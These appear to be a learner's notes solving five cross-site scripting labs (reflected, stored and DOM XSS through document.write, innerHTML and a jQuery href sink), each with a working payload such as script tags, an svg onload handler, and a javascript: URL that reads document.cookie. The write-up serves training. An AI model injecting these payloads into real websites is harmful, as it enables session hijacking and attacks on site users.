# XSS

# Lab: Reflected XSS into HTML context with nothing encoded

after searching for any key word the website will redirected to other url that contains the keyword in it and also it appears in the html code so simply we can search for:

    <script>alert(1)</script>

an alert will pop up in the page

# Lab: Stored XSS into HTML context with nothing encoded

in this lab see that when you go to post details you'll find form where you can submit your comment it will solved by commenting with:

    <script>alert(1)</script>

this payload will be stored as an comment each time when someone see post details he will recieve an alert bcz browser read this comment as html code

# Lab: DOM XSS in document.write sink using source location.search

inspect the source search for script that contains document.wirte here u'll filn that this script create new img tag and the source contains the search keyword we can use that to close the image tag and inject other html code

script content looks like:

```js
function trackSearch(query) { document.write('<img
  src="/resources/images/tracker.gif?searchTerms='+query+'"
/>'); } var query = (new URLSearchParams(window.location.search)).get('search');
if(query) { trackSearch(query); }
```

the solution:

```html
">
<script>
  alert(1);
</script>
```

# LAB: DOM XSS in innerHTML sink using source location.search

in this lab search keyword are appeared in the html using .innerHTML instead of document.write so script tags will not work there another way which is svg tag with on laod property

```html
<svg onload="alert(1)"></svg>
```

# LAB: DOM XSS in jQuery anchor href attribute sink using location.search source

here we have return link in the main url of send feedback page which is used for back button, in href tags we can inject js code like the following example

```html
<a href="javascript:{your_payload}">click me</a>
```

so the solution will be like that

```
https://0a84006604ccaa3c82516fab00d300f9.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```
